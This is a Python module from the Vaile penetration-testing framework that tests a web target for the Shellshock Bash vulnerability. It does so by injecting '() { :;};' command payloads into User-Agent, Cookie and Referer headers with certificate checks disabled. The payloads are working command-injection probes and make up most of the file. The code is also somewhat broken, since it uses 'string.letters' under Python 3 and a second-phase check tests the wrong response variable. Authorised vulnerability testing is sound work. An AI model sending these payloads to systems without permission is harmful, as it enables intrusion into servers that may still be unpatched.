#!/usr/bin/env python3
# coding: utf-8

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    Vaile Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#Author : @_tID
#This module requires Vaile Framework
#https://github.com/VainlyStrain/Vaile


import requests
import time
from random import *
import string
import re
from core.Core.colors import *

info = "This module tests the target for the shellshock vulnerability."
searchinfo = "Shellshock Tester"
properties = {}

def shellshock0x00(web):

    print(GR+' [*] Parsing strings...')
    time.sleep(0.5)
    r_str = ''.join(Random().sample(string.letters, 30))
    print(GR+' [*] Configuring payloads...')
    con = '() { :;}; echo; echo; echo %s'%(r_str)
    cmd = "() { test;};/bin/nopatchobfu"
    headers = {'User-agent': cmd}
    time.sleep(0.5)
    print(O+' [*] Making no-verify request...')
    time.sleep(1)
    r = requests.get(web, headers=headers, verify=False)
    if r.status_code == 500 or r.status_code == 502:
        print(G+' [+] The website seems Vulnerable to Shellshock...')
        time.sleep(0.5)
        print(O+' [*] Confirming the vulnerability...')

        headers = {
                    'User-Agent' : con,
                    'Cookie'     : con,
                    'Referer'    : con
                }

        resp = requests.get(web, headers=headers, verify=False)
        if resp.status_code == 200:
            if re.search(r_str,resp.content,re.I):
                print(G+' [+] ShellShock was found in: {}'.format(resp.url))

        elif r.status_code:
            print(R+' [-] 2nd phase of detection does not reveal vulnerability...')
            print(O+' [!] Please check manually...')
    else:
        print(R+' [-] The web seems immune to shellshock...')

def shellshock(web):

    print(GR+'\n [*] Loading module...')
    time.sleep(0.5)
    print(R+'\n    =====================')
    print(R+'     S H E L L S H O C K ')
    print(R+'    =====================\n')
    shellshock0x00(web)

def attack(web):
    shellshock(web)